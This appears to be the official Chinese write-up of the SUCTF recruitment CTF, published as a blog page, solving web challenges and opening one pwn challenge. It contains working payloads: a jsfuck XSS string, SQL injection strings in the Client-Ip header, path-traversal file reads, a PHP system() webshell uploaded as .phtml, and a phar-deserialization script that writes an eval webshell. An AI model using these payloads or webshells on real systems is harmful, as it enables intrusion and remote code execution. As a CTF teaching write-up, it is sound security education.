@@ -1,0 +1,839 @@
+<!doctype html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion">
+<head><meta name="generator" content="Hexo 3.9.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.4.0" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.0.1" rel="stylesheet" type="text/css">
+
+
+  <meta name="keywords" content="Writeup,">
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/images/s.ico?v=5.0.1">
+
+
+
+
+
+
+<meta name="description" content="SUCTF招新赛官方wp[TOC] ————Web这是个模版[web]xss1解法有多种。只要用&amp;quot;);闭合前面，再注释掉后面就行了。这里参考payload，用的jsfuck:1&quot;);[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]">
+<meta name="keywords" content="Writeup">
+<meta property="og:type" content="article">
+<meta property="og:title" content="SUCTF招新赛官方writeup">
+<meta property="og:url" content="http://yoursite.com/CTF/Writeup/SUCTF招新赛官方writeup/index.html">
+<meta property="og:site_name" content="SUS">
+<meta property="og:description" content="SUCTF招新赛官方wp[TOC] ————Web这是个模版[web]xss1解法有多种。只要用&amp;quot;);闭合前面，再注释掉后面就行了。这里参考payload，用的jsfuck:1&quot;);[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://gitlab.com/yuanLink/suctf2018/raw/nuaa/challenges/challenge-game/writeup/images/game0.png">
+<meta property="og:image" content="https://gitlab.com/yuanLink/suctf2018/raw/nuaa/challenges/challenge-dump/writeup/images/dmp04.png">
+<meta property="og:image" content="https://gitlab.com/yuanLink/suctf2018/raw/nuaa/challenges/challenge-dump/writeup/images/dmp05.png">
+<meta property="og:image" content="https://gitlab.com/yuanLink/suctf2018/raw/nuaa/challenges/challenge-dump/writeup/images/dmp07.png">
+<meta property="og:image" content="https://gitlab.com/yuanLink/suctf2018/raw/nuaa/challenges/challenge-dump/writeup/images/dmp06.png">
+<meta property="og:image" content="https://gitlab.com/yuanLink/suctf2018/raw/nuaa/challenges/challenge-dump/writeup/images/dmp08.png">
+<meta property="og:image" content="https://gitlab.com/yuanLink/suctf2018/raw/nuaa/challenges/challenge-dump/writeup/images/dmp09.png">
+<meta property="og:updated_time" content="2019-02-02T00:46:25.925Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="SUCTF招新赛官方writeup">
+<meta name="twitter:description" content="SUCTF招新赛官方wp[TOC] ————Web这是个模版[web]xss1解法有多种。只要用&amp;quot;);闭合前面，再注释掉后面就行了。这里参考payload，用的jsfuck:1&quot;);[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]">
+<meta name="twitter:image" content="https://gitlab.com/yuanLink/suctf2018/raw/nuaa/challenges/challenge-game/writeup/images/game0.png">
+
+
+
+<script type="text/javascript" id="hexo.configuration">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    scheme: 'Pisces',
+    sidebar: {"position":"right","display":"post"},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: undefined,
+      author: '博主'
+    }
+  };
+</script>
+
+
+
+
+  <link rel="canonical" href="http://yoursite.com/CTF/Writeup/SUCTF招新赛官方writeup/">
+
+  <title> SUCTF招新赛官方writeup | SUS </title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+  <script type="text/javascript">
+    var _hmt = _hmt || [];
+    (function() {
+      var hm = document.createElement("script");
+      hm.src = "//hm.baidu.com/hm.js?e877d3fb346f9b6606dfc92ef67f044f";
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(hm, s);
+    })();
+  </script>
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container one-collumn sidebar-position-right page-post-detail ">
+    <div class="headband"></div>
+    
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader" style="background-image: url('/images/home.jpg');">
+      <div class="header-inner"><a class="site-home" href="/">SUS</a>
+
+<div class="site-meta ">
+  
+
+  <div class="custom-logo-site-title">
+    <div href="/" class="brand">
+      <span class="logo-line-before"><i></i></span>
+      <span class="site-title">SUS</span>
+      <span class="logo-line-after"><i></i></span>
+    </div>
+  </div>
+  <p class="site-subtitle">秉承古典黑客精神，引领一流网络安全体验</p>
+</div>
+
+<div class="site-nav-toggle">
+  <button>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+    <span class="btn-bar"></span>
+  </button>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br>
+            
+            About
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-notice">
+          <a href="/tags/Notice/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-bell"></i> <br>
+            
+            Notice
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-course">
+          <a href="/course" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-book"></i> <br>
+            
+            Course
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-oj">
+          <a href="/CtfPlantform" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-flag"></i> <br>
+            
+            OJ
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-wiki">
+          <a href="/wiki" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-wikipedia-w"></i> <br>
+            
+            CTF-wiki
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+ </div>
+      <div class="header-post"> 
+  <div class="post-header">
+      <div class="tags">
+      
+        <a href="/tags/Writeup/" rel="tag" title="Writeup">Writeup</a>
+      
+      </div>
+      <h1>SUCTF招新赛官方writeup</h1>
+      <h2 class="subtitle"></h2>
+      <div class="post-time">
+        <span class="post-meta-item-text">Posted on </span>
+        <time itemprop="dateCreated" datetime="2019-02-02T08:44:59+08:00" content="2019-02-02" title="2019-02-02 08:44:59">
+          2019-02-02
+        </time>
+      </div>
+  </div>
+ </div>
+    </header>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                SUCTF招新赛官方writeup
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">Posted on</span>
+            <time itemprop="dateCreated" datetime="2019-02-02T08:44:59+08:00" content="2019-02-02">
+              2019-02-02
+            </time>
+          </span>
+
+          
+            <span class="post-category">
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/CTF/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/CTF/Writeup/" itemprop="url" rel="index">
+                    <span itemprop="name">Writeup</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          <!-- 
+            
+           -->
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="SUCTF招新赛官方wp"><a href="#SUCTF招新赛官方wp" class="headerlink" title="SUCTF招新赛官方wp"></a>SUCTF招新赛官方wp</h1><p>[TOC]</p>
+<h2 id="————"><a href="#————" class="headerlink" title="————"></a>————</h2><h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="这是个模版-web"><a href="#这是个模版-web" class="headerlink" title="这是个模版[web]"></a>这是个模版[web]</h3><h3 id="xss1"><a href="#xss1" class="headerlink" title="xss1"></a>xss1</h3><p>解法有多种。只要用<code>&quot;);</code>闭合前面，再注释掉后面就行了。<br>这里参考payload，用的jsfuck:<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">");[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]][([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]((![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+(![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+[+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]])();//</span></span><br></pre></td></tr></table></figure></p>
+<h3 id="xss2"><a href="#xss2" class="headerlink" title="xss2"></a>xss2</h3><p>题目只允许输入<code>!+[]</code>，想到jsfuck， <strong>eval(eval(input) + \’(1)\’)</strong> ，综合题意，只要可以使用eval(input)构造出’alert’字符串即可。</p>
+<p>get到jsfuck的编码方式，就解开了本题。记录如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">以下内容基于</span><br><span class="line">[]      =&gt;  []</span><br><span class="line"></span><br><span class="line">然后!可以将原类型转化为布尔型</span><br><span class="line">![]     =&gt;  false</span><br><span class="line">!![]    =&gt;  true</span><br><span class="line"></span><br><span class="line">+可以将原类型转化为整形</span><br><span class="line">+[]     =&gt;  0</span><br><span class="line">+![]    =&gt;  0</span><br><span class="line">+!![]   =&gt;  1</span><br><span class="line">然后可以推出所有数字 </span><br><span class="line"></span><br><span class="line">然后+[]可以转化为字符串</span><br><span class="line">[]+[]   =&gt;  &quot;&quot;</span><br><span class="line">![]+[]  =&gt;  &quot;false&quot;</span><br><span class="line">或放在前边</span><br><span class="line">[]+![]  =&gt;  &quot;false&quot;</span><br><span class="line">+[]+[]  =&gt;  &quot;0&quot;</span><br><span class="line"></span><br><span class="line">加括号试试</span><br><span class="line">([]+![])  =&gt;  &quot;false&quot;</span><br><span class="line">[[]+![]]  =&gt;  [&quot;false&quot;]</span><br><span class="line">(+[]+[])  =&gt;  &quot;0&quot;</span><br><span class="line">[+[]+[]]  =&gt;  [&quot;0&quot;]</span><br><span class="line"></span><br><span class="line">可以类似数组取下标</span><br><span class="line">(![]+[])[+!![]] =&gt;  &apos;a&apos;</span><br><span class="line"></span><br><span class="line">然后就可以从&apos;false&apos;, &apos;true&apos;中依次读出&apos;a&apos;,&apos;l&apos;,&apos;e&apos;,&apos;r&apos;,&apos;t&apos;。em...但是题目过滤了小括号。需要稍微绕一下，考虑使用中括号</span><br><span class="line">[[]+![]]    =&gt;  [&quot;false&quot;]</span><br><span class="line">[![]+[]][+[]]    =&gt;  &quot;false&quot;</span><br><span class="line">[![]+[]][+[]][+!![]]    =&gt;  &apos;a&apos;</span><br><span class="line"></span><br><span class="line">成功</span><br><span class="line"></span><br><span class="line">最后用加号拼出&quot;alert&quot;即可。</span><br></pre></td></tr></table></figure>
+<h3 id="php-is-No-1"><a href="#php-is-No-1" class="headerlink" title="php is No.1"></a>php is No.1</h3><p>源码审计题，当有两个is_numeric判断并用and连接时，and后面的is_numeric可以绕过。<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$test=<span class="keyword">false</span> <span class="keyword">and</span> <span class="keyword">true</span>;</span><br><span class="line">var_dump($test); <span class="comment">//返回true</span></span><br></pre></td></tr></table></figure></p>
+<p>接下来又是个弱相等，我们随便传个字符就行了。而且在php7以下的版本<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$time = <span class="number">5e6</span></span><br><span class="line"><span class="keyword">echo</span> (int)$time;<span class="comment">//输出的是5</span></span><br><span class="line">var_dump($time &lt; <span class="number">60</span> * <span class="number">60</span> * <span class="number">24</span> * <span class="number">30</span> * <span class="number">1</span>);<span class="comment">//返回true</span></span><br></pre></td></tr></table></figure></p>
+<p>最后参考payload:<br><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.68.67:94/?time=5e6&amp;num=a</span><br></pre></td></tr></table></figure></p>
+<h3 id="baby-upload"><a href="#baby-upload" class="headerlink" title="baby-upload"></a>baby-upload</h3><p>第一层：抓包或直接修改前端代码绕过js校验文件后缀</p>
+<p>第二层：图片mime类型绕过防护</p>
+<p>第三层：文件后缀为phps绕过白名单防护</p>
+<h3 id="inclue-me"><a href="#inclue-me" class="headerlink" title="inclue-me"></a>inclue-me</h3><p>描述的很清楚，包含index.php</p>
+<p>使用伪协议读取源码:php://filter/convert.base64-encode/resource=index.php</p>
+<h3 id="onepiece"><a href="#onepiece" class="headerlink" title="onepiece"></a>onepiece</h3><p>打开题目后index.php里提示我用了phpstorm，去找.idea</p>
+<p>在workspace.xml里面看到，后台有UpL0ad.php和README.html两个文件</p>
+<p>README.html里面直接说了，我有一个onepiece.zip</p>
+<p>下载onepiece.zip，解压后是我用在线的phpjm网站混淆过的php文件</p>
+<p>去网上搜索相关的关键词就能找到在线解密的网站（<a href="https://tool.lu/php）" target="_blank" rel="noopener">https://tool.lu/php）</a></p>
+<p>把php文件解密之后，这题就是一个简单的php代码审计（变量覆盖）</p>
+<p>在UpL0ad.php里post时，直接post参数： file=flag  就得到flag回显了</p>
+<h3 id="where-are-you-from-level-1"><a href="#where-are-you-from-level-1" class="headerlink" title="where are you from  level 1"></a>where are you from  level 1</h3><p>Client-Ip头设置为127.0.0.1即可。</p>
+<h3 id="where-are-you-from-level-2"><a href="#where-are-you-from-level-2" class="headerlink" title="where are you from  level 2"></a>where are you from  level 2</h3><p>Client-Ip处的注入，过滤了空格和一些关键字，但是关键字只过滤了一次，因此可以双写绕过。最终getflag的payload：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Client-Ip: 12&apos;,(selselectect/**/fl4g/**/ffromrom/**/flaaag))#</span><br></pre></td></tr></table></figure>
+<h3 id="gallery"><a href="#gallery" class="headerlink" title="gallery"></a>gallery</h3><p>flag:suctf{phar_s3rial1ze_f4nt4s71C}</p>
+<p>读取图片的接口存在任意文件读取的漏洞，可以读取到网站源码。cookie中给出提示<code>read recent papers about phar</code>,最近phar有关的比较热门的就是phar反序列化，生成phar的脚本为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"> <span class="class"><span class="keyword">class</span> <span class="title">PicManager</span></span>&#123;</span><br><span class="line">	 <span class="keyword">private</span> $current_dir;</span><br><span class="line">	 <span class="keyword">private</span> $whitelist=[<span class="string">'jpg'</span>,<span class="string">'png'</span>,<span class="string">'gif'</span>];</span><br><span class="line">	 <span class="keyword">private</span> $logfile=<span class="string">'request.log'</span>;</span><br><span class="line">	 <span class="keyword">private</span> $actions=[];</span><br><span class="line"></span><br><span class="line">	 <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($dir)</span></span>&#123;</span><br><span class="line">		 <span class="keyword">$this</span>-&gt;current_dir=$dir;</span><br><span class="line">		 <span class="keyword">if</span>(!is_dir($dir))@mkdir($dir);</span><br><span class="line">	 &#125;</span><br><span class="line"></span><br><span class="line">	 <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">_log</span><span class="params">($message)</span></span>&#123;</span><br><span class="line">		 array_push(<span class="keyword">$this</span>-&gt;actions,<span class="string">'['</span>.date(<span class="string">'y-m-d h:i:s'</span>,time()).<span class="string">']'</span>.$message);</span><br><span class="line">	 &#125;</span><br><span class="line"></span><br><span class="line">	 <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">pics</span><span class="params">()</span></span>&#123;</span><br><span class="line">		 log(<span class="string">'list pics'</span>);</span><br><span class="line">		 $pics=[];</span><br><span class="line">		 <span class="keyword">foreach</span>(scandir($dir) <span class="keyword">as</span> $item)&#123;</span><br><span class="line">			 <span class="keyword">if</span>(in_array(substr($item,<span class="number">-4</span>),$whitelist))</span><br><span class="line">				 array_push($pics,$current_dir.<span class="string">"/"</span>.$item);</span><br><span class="line">		 &#125;</span><br><span class="line">		 <span class="keyword">return</span> $pics;</span><br><span class="line">	 &#125;</span><br><span class="line">	 <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">upload_pic</span><span class="params">()</span></span>&#123;</span><br><span class="line">		 _log(<span class="string">'upload pic'</span>);</span><br><span class="line">		 $file=$_FILES[<span class="string">'file'</span>][<span class="string">'name'</span>];</span><br><span class="line">		 <span class="keyword">if</span>(!in_array(substr($file,<span class="number">-4</span>),<span class="keyword">$this</span>-&gt;whitelist))&#123;</span><br><span class="line">			 _log(<span class="string">'unsafe deal:upload filename '</span>.$file);</span><br><span class="line">			 <span class="keyword">return</span>;</span><br><span class="line">		 &#125;</span><br><span class="line">		 $newname=md5($file).substr($file,<span class="number">-4</span>);</span><br><span class="line">		 move_uploaded_file($_FILES[<span class="string">'file'</span>][<span class="string">'tmp_name'</span>],$current_dir.<span class="string">'/'</span>.$newname);</span><br><span class="line">	 &#125;</span><br><span class="line">	 <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_pic</span><span class="params">($picname)</span></span>&#123;</span><br><span class="line">		 _log(<span class="string">'get pic'</span>.$picname);</span><br><span class="line">		 <span class="keyword">if</span>(!file_exists($picname))</span><br><span class="line">			 <span class="keyword">return</span> <span class="string">''</span>;</span><br><span class="line">		 <span class="keyword">else</span> <span class="keyword">return</span> file_get_contents($picname);</span><br><span class="line">	 &#125;</span><br><span class="line">	 <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		 $fp=fopen(<span class="keyword">$this</span>-&gt;current_dir.<span class="string">'/'</span>.<span class="keyword">$this</span>-&gt;logfile,<span class="string">"a+"</span>);</span><br><span class="line">		 <span class="keyword">foreach</span>(<span class="keyword">$this</span>-&gt;actions <span class="keyword">as</span> $act)&#123;</span><br><span class="line">			 fwrite($fp,$act.<span class="string">"\n"</span>);</span><br><span class="line">		 &#125;</span><br><span class="line">		 fclose($fp);</span><br><span class="line">	 &#125;</span><br><span class="line"></span><br><span class="line">	 <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">gen</span><span class="params">()</span></span>&#123;</span><br><span class="line">		 @rmdir(<span class="keyword">$this</span>-&gt;current_dir);</span><br><span class="line">		 <span class="keyword">$this</span>-&gt;current_dir=<span class="string">"/var/www/html/sandbox/1b5337d0c8ad813197b506146d8d503d/"</span>; <span class="comment">//md5($_SERVER['REMOTE_ADDR'])</span></span><br><span class="line">		 <span class="keyword">$this</span>-&gt;logfile=<span class="string">'out.php'</span>;</span><br><span class="line">		 <span class="keyword">$this</span>-&gt;actions=[<span class="string">'&lt;?php eval($_REQUEST[p]);'</span>];</span><br><span class="line">		 @unlink(<span class="string">'phar.phar'</span>);</span><br><span class="line">		 $phar = <span class="keyword">new</span> Phar(<span class="string">"phar.phar"</span>);</span><br><span class="line">		 $phar-&gt;startBuffering();</span><br><span class="line">		 $phar-&gt;setStub(<span class="string">"GIF89a"</span>.<span class="string">"&lt;?php __HALT_COMPILER(); ?&gt;"</span>); <span class="comment">//设置stub，增加gif文件头用以欺骗检测</span></span><br><span class="line">		 $phar-&gt;setMetadata(<span class="keyword">$this</span>); <span class="comment">//将自定义meta-data存入manifest</span></span><br><span class="line">		 $phar-&gt;addFromString(<span class="string">"test.txt"</span>, <span class="string">"test"</span>); <span class="comment">//添加要压缩的文件</span></span><br><span class="line">			     <span class="comment">//签名自动计算</span></span><br><span class="line">		 $phar-&gt;stopBuffering();</span><br><span class="line">			 <span class="comment">//    </span></span><br><span class="line"></span><br><span class="line">	 &#125;</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">$pic=<span class="keyword">new</span> PicManager(<span class="string">'/var/www/html/sandbox'</span>);</span><br><span class="line">$pic-&gt;gen();</span><br></pre></td></tr></table></figure></p>
+<p>生成phar后重命名为图片文件，上传后访问<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?act=get&amp;file=phar:///上传后的图片路径</span><br></pre></td></tr></table></figure></p>
+<p>再访问生成的out.php即可获取flag</p>
+<h3 id="ClassicSqli"><a href="#ClassicSqli" class="headerlink" title="ClassicSqli"></a>ClassicSqli</h3><ul>
+<li>用;%00截断末尾</li>
+<li>/**/代替空格</li>
+<li>regexp代替等号<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=&quot;?user=\&amp;pw=^0%26%26user/**/regexp/**/0x61646d696e%26%26pw/**/regexp/**/%22^&#123;&#125;%22;%00&quot;</span><br></pre></td></tr></table></figure>
+</li>
+</ul>
+<h3 id="秘密云盘"><a href="#秘密云盘" class="headerlink" title="秘密云盘"></a>秘密云盘</h3><p>这题就是超简单的任意文件读取，没有任何坑点，下载链接为 ?file=base64之后的文件名。<br>由readme.txt可知  flag在flag.php中。<br>因此payload为 ?file=ZmxhZy5waHA=  即可。</p>
+<h3 id="403readfile"><a href="#403readfile" class="headerlink" title="403readfile"></a>403readfile</h3><ul>
+<li>从http状态码和页面ip判断403异常是假的</li>
+<li>扫描后台文件发现robots.txt，得到flag.php和get.php。</li>
+<li>尝试get.php可确定思路为通过get.php读取flag.php。</li>
+<li>get.php尝试里放了hint.txt,默认的链接里也有./1.txt,尝试1.txt发现回显正常即可猜测’./‘被过滤（这一步考虑难度其实是准备tips放源码，不过有大师傅真的做出来了。。tql。。。）</li>
+<li>接下来就可以尝试用’./‘截断被过滤../和flag关键字</li>
+<li>最终payload为  ?file=…//fl./ag.php</li>
+</ul>
+<h3 id="EASY-upload"><a href="#EASY-upload" class="headerlink" title="EASY_upload"></a>EASY_upload</h3><ol>
+<li>抓包修改Content-Type为image/png  </li>
+<li><p>使用如下一句话</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">"php"</span>&gt;</span><br><span class="line">@system($_GET[<span class="string">'c'</span>]);</span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>改后缀为phtml</p>
+</li>
+</ol>
+<p>最后getshell读flag<br><a href="http://xxxxxxx/upload/shell.phtml?c=cat%20../flag.php" target="_blank" rel="noopener">http://xxxxxxx/upload/shell.phtml?c=cat%20../flag.php</a></p>
+<h3 id="secure-html"><a href="#secure-html" class="headerlink" title="secure html"></a>secure html</h3><ul>
+<li>secure_html.php为每个用户创建session和对应的html文件，并用include进行了文件包含</li>
+<li>通过secure_html.php写入html文件时对PHP代码进行了简单粗暴的过滤，并关闭了对其他PHP格式的支持，难以绕过</li>
+<li>脑洞:本题nginx开启了webdav模块，支持用http方法中的PUT更新pages目录下的html文件</li>
+<li>用fiddler等代理工具构造PUT请求直接向html文件写入PHP代码，返回204状态码则表明写入成功</li>
+<li>再次访问secure_html.php，代码被执行，实现RCE</li>
+<li>flag在根目录下</li>
+</ul>
+<p>PUT消息体：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;? echo `cat /flag`;</span><br></pre></td></tr></table></figure></p>
+<h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="easy-overflow-file-structure"><a href="#easy-overflow-file-structure" class="headerlink" title="easy_overflow_file_structure"></a>easy_overflow_file_structure</h3><p>fsop的超简化版本，解析请求头字段的循环退出不当，可发送多个重复字段导致缓冲区溢出，覆盖相邻的fd结构中的flag成员为<code>0xdeadbeef</code>即可。</p>
